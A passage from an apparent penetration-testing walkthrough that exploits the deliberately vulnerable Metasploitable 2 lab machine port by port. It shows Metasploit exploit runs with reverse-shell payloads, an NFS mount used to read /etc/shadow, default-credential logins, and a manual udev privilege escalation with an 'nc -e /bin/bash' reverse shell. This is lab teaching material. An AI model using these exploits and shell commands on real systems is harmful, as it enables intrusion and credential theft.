[</em>] A is input&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo D0Yvs2n6TnTUDmPF;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Command shell session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:54381) at 2014-06-08 17:31:48 +0300
[</em>] Reading from socket B
[<em>] B: &ldquo;D0Yvs2n6TnTUDmPF\r\n&rdquo;
[</em>] Matching&hellip;
[*] A is input&hellip;</p>

<p>whoami
www-data
```</p>

<p>This is a low privilege shell, but we can escalate to root via the udev exploit, as shown later.</p>

<h3>Port 445 samba</h3>

<p>First, I&rsquo;ll use an auxiliary module to get the server&rsquo;s version:</p>

<p>``` plain
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > show options</p>

<p>Module options (auxiliary/scanner/smb/smb_version):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads</p>

<p>msf auxiliary(smb_version) > set RHOSTS 192.168.127.154
RHOSTS => 192.168.127.154
msf auxiliary(smb_version) > run</p>

<p>[<em>] 192.168.127.154:445 is running Unix Samba 3.0.20-Debian (language: Unknown) (domain:WORKGROUP)
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```</p>

<p>With that information in hand, we can now use a suitable exploit against the target:</p>

<p><strong>Samba &ldquo;username map script&rdquo; Command Execution</strong></p>

<blockquote><p>This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default &ldquo;username map
script&rdquo; configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No
authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p></blockquote>

<p>``` plain
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show options</p>

<p>Module options (exploit/multi/samba/usermap_script):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST                   yes       The target address
   RPORT  139              yes       The target port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(usermap_script) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(usermap_script) > show options</p>

<p>Module options (exploit/multi/samba/usermap_script):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST  192.168.127.154  yes       The target address
   RPORT  139              yes       The target port</p>

<p>Payload options (cmd/unix/reverse):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(usermap_script) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(usermap_script) > set RPORT 445
RPORT => 445
msf exploit(usermap_script) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
[</em>] Command: echo f8rjvIDZRdKBtu0F;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Reading from socket B
[<em>] B: &ldquo;f8rjvIDZRdKBtu0F\r\n&rdquo;
[</em>] Matching&hellip;
[<em>] A is input&hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:46653) at 2014-06-04 22:23:23 +0300</p>

<p>whoami
root</p>

<p>```</p>

<h3>Port 514 tcpwrapped</h3>

<p>The nmap scan revealed the port is open but it&rsquo;s tcpwrapped. Let&rsquo;s first see what that means:</p>

<blockquote><p>TCP Wrapper is a host-based networking access control list system, used to filter network access to Internet Protocol servers on (Unix-
like) operating systems such as Linux or BSD.  (Wikipedia)</p></blockquote>

<p>So we can conclude the port is protected by TCP Wrapper. If we try to netcat to the port, we see this:</p>

<p>``` plain
nc -vvn 192.168.127.154 514</p>

<p>(UNKNOWN) [192.168.127.154] 514 (shell) open
```</p>

<p>I ran a Nessus scan against the target, and according to the report, a critical vulnerability is present on this port:</p>

<p><strong>rsh Unauthenticated Access (via finger Information)</strong></p>

<p><strong>Synopsis</strong></p>

<p>It was possible to log on this machine without password.</p>

<p><strong>Description</strong></p>

<p>Using common usernames as well as the usernames reported by &lsquo;finger&rsquo;, Nessus was able to log in through rsh. Either the accounts are not protected by passwords or the ~/.rhosts files are not configured properly.</p>

<p>This vulnerability is confirmed to exist in Cisco Prime LAN Management Solution, but could be present on any host that is not securely configured.</p>

<p><strong>Port</strong><br/>
tcp/514</p>

<p>So all we have to do is log in via the remote shell program:</p>

<p>``` plain
rsh 192.168.127.154</p>

<p>Last login: Wed May  7 11:00:37 EDT 2014 from :0.0 on pts/0</p>

<p>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</p>

<p>The programs included with the Ubuntu system are free software;</p>

<p>the exact distribution terms for each program are described in the</p>

<p>individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</p>

<p>applicable law.</p>

<p>To access official Ubuntu documentation, please visit:</p>

<p><a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a></p>

<p>You have mail.</p>

<p>root@metasploitable:~#
```</p>

<h3>Port 1099 java-rmi</h3>

<p>Let&rsquo;s continue our exploitation. Anything labeled Java is bound to be interesting from a security perspective :)</p>

<p>Searching for Java exploits yielded something interesting:</p>

<p><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong></p>

<blockquote><p>This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from
any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be
used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java
Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java
process. RMI method calls do not support or require any sort of authentication.</p></blockquote>

<p>``` plain
msf > use exploit/multi/misc/java_rmi_server<br/>
msf exploit(java_rmi_server) > show options</p>

<p>Module options (exploit/multi/misc/java_rmi_server):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   RHOST                     yes       The target address
   RPORT    1099             yes       The target port
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Generic (Java Payload)</p>

<p>msf exploit(java_rmi_server) > set RHOST 192.168.127.154
RHOST => 192.168.127.154</p>

<p>msf exploit(java_rmi_server) > set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf exploit(java_rmi_server) > show options</p>

<p>Module options (exploit/multi/misc/java_rmi_server):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   RHOST    192.168.127.154  yes       The target address
   RPORT    1099             yes       The target port
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)</p>

<p>Payload options (java/meterpreter/reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Generic (Java Payload)</p>

<p>msf exploit(java_rmi_server) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(java_rmi_server) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Using URL: <a href="http://0.0.0.0:8080/oVUJAkfU">http://0.0.0.0:8080/oVUJAkfU</a>
[<em>]  Local IP: <a href="http://192.168.127.159:8080/oVUJAkfU">http://192.168.127.159:8080/oVUJAkfU</a>
[</em>] Connected and sending request for <a href="http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar">http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar</a>
[<em>] 192.168.127.154  java_rmi_server &ndash; Replied to request for payload JAR
[</em>] Sending stage (30355 bytes) to 192.168.127.154
[<em>] Meterpreter session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:36965) at 2014-06-04 22:42:17 +0300
[+] Target 192.168.127.154:1099 may be exploitable&hellip;
[</em>] Server stopped.</p>

<p>meterpreter > getuid
Server username: root
meterpreter >
```</p>

<h3>Port 1524 shell</h3>

<p>Well, not much to say here. There&rsquo;s already a nice, cozy shell waiting for connections, so nothing extra needs to be done.</p>

<h3>Port 2049 nfs</h3>

<p>Let&rsquo;s use the the <strong>showmount</strong> command to see the NFS server&rsquo;s export list. This command displays mount information for an NFS server. The -e flag is for showing exports:</p>

<p>``` plain
showmount -e 192.168.127.154</p>

<p>Export list for 192.168.127.154:</p>

<p>/ *
```</p>

<p>How nice! The root directory is shared. So, let&rsquo;s mount it then:</p>

<p>``` plain
mkdir /metafs # this will be the mount point</p>

<p>mount -t nfs 192.168.127.154:/ /metafs -o nolock # mount the remote shared directory as nfs and disable file locking
```</p>

<p>Now we can read  the passwords and everything else:</p>

<p>``` plain
cat /metafs/etc/shadow</p>

<p>root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::</p>

<p>&hellip;&hellip;&hellip;.etc&hellip;&hellip;&hellip;.
```</p>

<h3>Port 3306 mysql</h3>

<p>The Nessus scan that I ran against the target revealed the following:</p>

<p><strong>MySQL Unpassworded Account Check</strong></p>

<p><strong>Synopsis</strong></p>

<p>The remote database server can be accessed without a password.</p>

<p><strong>Description</strong></p>

<p>It is possible to connect to the remote MySQL database server using an unpassworded account. This may allow an
attacker to launch further attacks against the database.</p>

<p>The &lsquo;root&rsquo; account does not have a password.
Here is the list of databases on the remote server :
&ndash; information_schema
&ndash; dvwa
&ndash; metasploit
&ndash; mysql
&ndash; owasp10
&ndash; tikiwiki
&ndash; tikiwiki195</p>

<p>Let&rsquo;s see if we can indeed connect to the database as root without a password:</p>

<p>``` plain
mysql -u root -p -h 192.168.127.154
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.0.51a-3ubuntu5 (Ubuntu)</p>

<p>Copyright &copy; 2000, 2014, Oracle and/or its affiliates. All rights reserved.</p>

<p>Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>mysql>
```</p>

<p>Now we can look inside the databases and get any data that might interest us.</p>

<h3>Port 3632 distccd</h3>

<p>distccd  is  the  server  for  the  distcc distributed compiler. It accepts and runs compilation jobs for network clients. Metasploit has an exploit avaiable for this:</p>

<p><strong>DistCC Daemon Command Execution</strong></p>

<blockquote><p>This module uses a documented security weakness to execute arbitrary commands on any system running distccd.</p></blockquote>

<p>``` plain
msf > use exploit/unix/misc/distcc_exec
msf exploit(distcc_exec) > show options</p>

<p>Module options (exploit/unix/misc/distcc_exec):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST                   yes       The target address
   RPORT  3632             yes       The target port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Target</p>

<p>msf exploit(distcc_exec) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(distcc_exec) > show options</p>

<p>Module options (exploit/unix/misc/distcc_exec):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST  192.168.127.154  yes       The target address
   RPORT  3632             yes       The target port</p>

<p>Payload options (cmd/unix/reverse):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Target</p>

<p>msf exploit(distcc_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(distcc_exec) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
[</em>] Command: echo VhuwDGXAoBmUMNcg;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Reading from socket B
[<em>] B: &ldquo;VhuwDGXAoBmUMNcg\r\n&rdquo;
[</em>] Matching&hellip;
[<em>] A is input&hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:52283) at 2014-06-05 21:34:46 +0300</p>

<p>whoami
daemon
```</p>

<p>So we have a low privilege account. Time for some local privilege escalation. I will use this exploit: <a href="http://www.exploit-db.com/exploits/8572/">http://www.exploit-db.com/exploits/8572/</a></p>

<p><strong>Description</strong></p>

<p>udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.</p>

<p><strong>Usage</strong></p>

<p>Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, usually is the udevd PID minus 1) as argv[1].</p>

<p>The exploit will execute /tmp/run as root so throw whatever payload you want in there.</p>

<p>Ok, on the command line on the victim, I looked for netcat and fortunately, it&rsquo;s installed:</p>

<p><code>plain
whereis nc
nc: /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz
</code></p>

<p>So I will compile the exploit and send it over netcat. I am on a 64 bit Kali and the target is 32 bit, so I compile it explicitly for 32 bit:</p>

<p><code>plain
gcc -m32 8572.c -o 8572
nc -vv -l -p 5555 &lt; 8572
</code></p>

<p>From the victim, I go to the /tmp/ directory and grab the exploit from the attacking machine:</p>

<p><code>plain
nc -v -n 192.168.127.159 5555 &gt; 8572
</code></p>

<p>Next, let&rsquo;s look for the PID:</p>

<p><code>plain
cat /proc/net/netlink
</code></p>

<p>And the relevant line is:</p>

<p><code>plain
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
df8cc200 15  2767   00000001 0        0        00000000 2
</code></p>

<p>Check that this is the correct PID by looking at the udev service:</p>

<p><code>plain
ps aux | grep udev
root      2768  0.0  0.1   2092   620 ?        S&lt;s  14:11   0:00 /sbin/udevd --daemon
</code></p>

<p>It appears to be the right one (2768 &ndash; 1 = 2767)</p>

<p>Next, put some payload in /tmp/run, since that will be executed by the exploit. I will use netcat to connect to the atacker machine and give it a shell:</p>

<p><code>plain
echo '#!/bin/bash' &gt; /tmp/run
echo 'nc -e /bin/bash 192.168.127.159 5555' &gt;&gt; /tmp/run
</code></p>

<p>On the attacker machine, listen on port 5555:</p>

<p><code>plain
nc -v -l -p 5555
</code></p>

<p>And on the victim machine, now that all is set up, I just make the exploit executable and run it:</p>

<p><code>plain
chmod +x 8572
./8572 2767
</code></p>

<p>Now check our local netcat listener for the root shell:</p>

<p><code>plain
nc: connect to 192.168.127.159 5555 from 192.168.127.154 (192.168.127.154) 35539 [35539]
whoami
root
</code></p>

<p>A bit on effort on that one, but all the more rewarding! Let&rsquo;s move on.</p>

<h3>Port 5432 postgresql</h3>

<p>Since I already saw earlier that the mysql database wasn&rsquo;t password protected, I will try a bruteforce auxiliary module to see if I can get in this one.</p>

<p><strong>PostgreSQL Login Utility</strong></p>

<blockquote><p>This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and
USERPASS_FILE options.</p></blockquote>

<p>``` plain
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(postgres_login) > show options</p>

<p>Module options (auxiliary/scanner/postgres/postgres_login):</p>

<p>   Name              Current Setting                                                             Required  Description</p>

<hr />

<p>   BLANK_PASSWORDS   false                                                                       no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                                                   yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                       no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                       no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                       no        Add all users in the current database to the list
   PASSWORD                                                                                      no        A specific password to authenticate with
   PASS_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   RETURN_ROWSET     true                                                                        no        Set to true to see query result sets
   RHOSTS                                                                                        yes       The target address range or CIDR identifier
   RPORT             5432                                                                        yes       The target port
   STOP_ON_SUCCESS   false                                                                       yes       Stop guessing when a credential works for a host
   THREADS           1                                                                           yes       The number of concurrent threads
   USERNAME          postgres                                                                    no        A specific username to authenticate as
   USERPASS_FILE     /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                       no        Try the username as the password for all users
   USER_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                        yes       Whether to print output for all attempts</p>

<p>msf auxiliary(postgres_login) > set RHOSTS 192.168.127.154
RHOSTS => 192.168.127.154
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(postgres_login) > run</p>

<p>[<em>] 192.168.127.154:5432 Postgres &ndash; [01/20] &ndash; Trying username:&lsquo;postgres&rsquo; with password:&lsquo;postgres&rsquo; on database &lsquo;template1&rsquo;
[+] 192.168.127.154:5432 Postgres &ndash; Logged in to &lsquo;template1&rsquo; with &lsquo;postgres&rsquo;:&lsquo;postgres&rsquo;
[+] 192.168.127.154:5432 Postgres &ndash; Success: postgres:postgres (Database &lsquo;template1&rsquo; succeeded.)
[</em>] 192.168.127.154:5432 Postgres &ndash; Disconnected
[<em>] Scanned 1 of 1 hosts (100% complete)
[</em>] Auxiliary module execution completed
```
So it&rsquo;s possible to log in to this database like earlier with mysql, but I searched through Metasploit&rsquo;s available exploits, and I stumbled upon one that can further the exploitation:</p>

<p><strong>PostgreSQL for Linux Payload Execution</strong></p>

<blockquote><p>On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries&rsquo;s
om there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE
pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared
object&rsquo;s constructor, it does not need to conform to specific Postgres API versions.</p></blockquote>

<p>``` plain
msf > use exploit/linux/postgres/postgres_payload
msf exploit(postgres_payload) > show options</p>

<p>Module options (exploit/linux/postgres/postgres_payload):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   DATABASE  template1        yes       The database to authenticate against
   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
   RHOST                      yes       The target address
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Linux x86</p>

<p>msf exploit(postgres_payload) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(postgres_payload) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
set PASSWORD postgres
PASSWORD => postgres
msf exploit(postgres_payload) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] 192.168.127.154:5432 &ndash; PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[<em>] Uploaded as /tmp/uVhDfWDg.so, should be cleaned up automatically
[</em>] Transmitting intermediate stager for over-sized stage&hellip;(100 bytes)
[<em>] Sending stage (1228800 bytes) to 192.168.127.154
[</em>] Meterpreter session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:37141) at 2014-06-06 22:49:17 +0300
```</p>

<p>From here we again have to elevate our privileges. I will exploit the same vulnerability with the udev exploit, but this time from inside Metasploit:</p>

<p>``` plain
meterpreter > background
[*] Backgrounding session 1&hellip;
msf exploit(postgres_payload) > use exploit/linux/local/udev_netlink
msf exploit(udev_netlink) > show options</p>

<p>Module options (exploit/linux/local/udev_netlink):</p>

<p>   Name         Current Setting  Required  Description</p>

<hr />

<p>   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
   SESSION                       yes       The session to run this module on.
   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Linux x86</p>

<p>msf exploit(udev_netlink) > set SESSION 1
SESSION => 1
msf exploit(udev_netlink) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Attempting to autodetect netlink pid&hellip;
[<em>] Meterpreter session, using get_processes to find netlink pid
[</em>] udev pid: 2770
[+] Found netlink pid: 2769
[<em>] Writing payload executable (274 bytes) to /tmp/rzIcSWveTb
[</em>] Writing exploit executable (1879 bytes) to /tmp/DQDnKUFLzR
[<em>] chmod'ing and running it&hellip;
[</em>] Command shell session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:33383) at 2014-06-06 23:03:13 +0300</p>

<p>whoami
root
```</p>

<p>So, the same exploit that I manually used earlier was very easy and quick in Metasploit. Onwards!</p>

<h3>Port 5900 vnc</h3>

<p>The Nessus scan reported that the server is using the password &lsquo;password&rsquo;. So I will use vncviewer to connect to it:</p>

<p><code>plain
vncviewer 192.168.127.154
Connected to RFB server, using protocol version 3.3
Performing standard VNC authentication
Password:
Authentication successful
Desktop name "root's X desktop (metasploitable:0)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
</code></p>

<p><img class="center" src="/images/vnc.png" title="&lsquo;vnc shell&rsquo; &lsquo;vnc&rsquo;" ></p>

<p>And we have another root shell.</p>

<h3>Port 6667 irc</h3>

<p>An exploit is available for this:</p>

<p><strong>UnrealIRCD 3.2.8.1 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
archive between November 2009 and June 12th 2010.</p></blockquote>

<p>``` plain
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > show options</p>

<p>Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST                   yes       The target address
   RPORT  6667             yes       The target port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Target</p>

<p>msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(unreal_ircd_3281_backdoor) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] Connected to 192.168.127.154:6667&hellip;</p>

<pre><code>:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
</code></pre>

<p>[<em>] Sending backdoor command&hellip;
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
[</em>] Command: echo qcHh6jsH8rZghWdi;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Reading from socket B
[<em>] B: &ldquo;qcHh6jsH8rZghWdi\r\n&rdquo;
[</em>] Matching&hellip;
[<em>] A is input&hellip;
[</em>] Command shell session 3 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:41975) at 2014-06-06 23:31:44 +0300</p>

<p>whoami
root
```</p>

<h3>Port 8180 tomcat</h3>

<p>First, let&rsquo;s see what information we can get using the <strong>Tomcat Administration Tool Default Access</strong> module:</p>

<p>``` plain
msf > use auxiliary/admin/http/tomcat_administration
msf auxiliary(tomcat_administration) > show options</p>

<p>Module options (auxiliary/admin/http/tomcat_administration):</p>

<p>   Name         Current Setting  Required  Description</p>

<hr />

<p>   Proxies                       no        Use a proxy chain
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT        8180             yes       The target port
   THREADS      1                yes       The number of concurrent threads
   TOMCAT_PASS                   no        The password for the specified username
   TOMCAT_USER                   no        The username to authenticate as
   VHOST                         no        HTTP server virtual host</p>

<p>msf auxiliary(tomcat_administration) > set RHOSTS 192.168.127.154
RHOSTS => 192.168.127.154
msf auxiliary(tomcat_administration) > run</p>

<p>[<em>] <a href="http://192.168.127.154:8180/admin">http://192.168.127.154:8180/admin</a> [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```</p>

<p>With credentials in hand, now we can use the <strong>Apache Tomcat Manager Application Deployer Authenticated Code Execution</strong> exploit:</p>

<blockquote><p>This module can be used to execute a payload on Apache Tomcat servers that have an exposed &ldquo;manager&rdquo; application. The payload is uploaded as a WAR archive
containing a jsp application using a PUT request. The manager application can also be abused using /manager/html/upload, but that method is not implemented in > this module. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows
payloads.</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy) > show options</p>

<p>Module options (exploit/multi/http/tomcat_mgr_deploy):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   PASSWORD                   no        The password for the specified username
   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                    no        Use a proxy chain
   RHOST                      yes       The target address
   RPORT     80               yes       The target port
   USERNAME                   no        The username to authenticate as
   VHOST                      no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
PASSWORD => tomcat
msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
USERNAME => tomcat
msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
PASSWORD => tomcat
msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
USERNAME => tomcat
msf exploit(tomcat_mgr_deploy) > set RPORT 8180
RPORT => 8180
msf exploit(tomcat_mgr_deploy) > set payload  java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf exploit(tomcat_mgr_deploy) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(tomcat_mgr_deploy) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:8888
[</em>] Attempting to automatically select a target&hellip;
[<em>] Automatically selected target &ldquo;Linux x86&rdquo;
[</em>] Uploading 13833 bytes as RuoE02Uo7DeSsaVp7nmb79cq.war &hellip;
[<em>] Executing /RuoE02Uo7DeSsaVp7nmb79cq/19CS3RJj.jsp&hellip;
[</em>] Undeploying RuoE02Uo7DeSsaVp7nmb79cq &hellip;
[*] Command shell session 4 opened (192.168.127.159:8888 &ndash;> 192.168.127.154:33966) at 2014-06-06 23:51:01 +0300</p>

<p>whoami
tomcat55
```</p>

<p>We can elevate our privileges using the udev exploit from earlier, so I won&rsquo;t go over it again.</p>

<h3>Port 8787 drb</h3>

<p>First I wanted to know what this drb is, since I wasn&rsquo;t familiar with it.</p>

<blockquote><p>Distributed Ruby or DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method
invocation (RMI) to pass commands and data between processes (Wikipedia)</p></blockquote>

<p>Then I searched in Metasploit for an exploit, and luckily, I got a hit:</p>

<p><strong>Distributed Ruby Send instance_eval/syscall Code Execution</strong></p>

<blockquote><p>This module exploits remote code execution vulnerabilities in dRuby</p></blockquote>

<p>``` plain
msf > use exploit/linux/misc/drb_remote_codeexec
msf exploit(drb_remote_codeexec) > show options</p>

<p>Module options (exploit/linux/misc/drb_remote_codeexec):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>   URI                    yes       The dRuby URI of the target host (druby://host:port)</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(drb_remote_codeexec) > set URI druby://192.168.127.154:8787
URI => druby://192.168.127.154:8787</p>

<p>msf exploit(drb_remote_codeexec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(drb_remote_codeexec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(drb_remote_codeexec) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] trying to exploit instance_eval
[<em>] instance eval failed, trying to exploit syscall
[&ndash;] Exploit failed: Errno::EINVAL Invalid argument
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
